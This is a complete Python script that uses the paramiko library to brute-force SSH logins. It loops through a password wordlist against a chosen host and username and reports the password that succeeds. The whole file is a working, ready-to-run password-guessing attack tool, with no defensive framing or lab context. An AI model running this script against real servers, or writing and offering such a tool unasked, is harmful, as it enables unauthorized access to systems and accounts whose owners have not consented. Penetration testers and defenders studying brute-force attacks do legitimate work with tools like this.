import paramiko
import sys
import socket

def ssh_bruteforcer(hostname, username, wordlist_file):
    """
    Attempts to brute-force an SSH password.

    Args:
        hostname (str): The target SSH server hostname or IP.
        username (str): The username to brute-force.
        wordlist_file (str): The path to the wordlist file.
    """
    print(f"[*] Starting SSH brute-force on {hostname} for user {username}...")
    
    try:
        with open(wordlist_file, "r") as f:
            wordlist = f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_file}")
        return

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in wordlist:
        try:
            print(f"[*] Trying password: {password}")
            ssh_client.connect(hostname, username=username, password=password, timeout=10, look_for_keys=False)
            print(f"[+] Password found! Username: {username}, Password: {password}")
            ssh_client.close()
            return
        except paramiko.AuthenticationException:
            # Authentication failed, try next password
            continue
        except socket.timeout:
            print("[-] Connection timed out. The host may be rate-limiting.")
            return
        except Exception as e:
            print(f"[-] An error occurred: {e}")
            return
            
    print("[-] No password found in the wordlist.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python ssh_bruteforcer.py <hostname> <username> <wordlist_file>")
        sys.exit(1)
        
    target_host = sys.argv[1]
    user = sys.argv[2]
    wordlist = sys.argv[3]
    ssh_bruteforcer(target_host, user, wordlist)
